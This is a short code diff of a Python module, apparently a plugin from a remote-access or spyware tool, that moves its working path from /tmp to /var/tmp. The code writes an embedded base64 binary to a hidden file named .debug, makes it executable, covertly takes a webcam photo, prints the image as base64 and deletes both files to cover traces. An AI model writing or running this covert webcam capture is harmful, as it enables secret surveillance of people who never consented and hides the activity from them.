@@ -15,15 +15,15 @@ def run_command(command):
 
 
 def run(options):
-    with open("/tmp/.debug", "wb") as output_file:
+    with open("/var/tmp/.debug", "wb") as output_file:
         output_file.write(b64decode(BINARY))
-        run_command("chmod a+x /tmp/.debug")
+        run_command("chmod a+x /var/tmp/.debug")
 
     # Takes the webcam picture, waits 2 seconds for the camera to warm up.
-    run_command("/tmp/.debug -w 2 /tmp/.debug.png")
+    run_command("/var/tmp/.debug -w 2 /var/tmp/.debug.png")
     sleep(2)
 
-    print(run_command("base64 /tmp/.debug.png"))
+    print(run_command("base64 /var/tmp/.debug.png"))
 
-    run_command("rm -rf /tmp/.debug.png")
-    run_command("rm -rf /tmp/.debug")
+    run_command("rm -rf /var/tmp/.debug.png")
+    run_command("rm -rf /var/tmp/.debug")
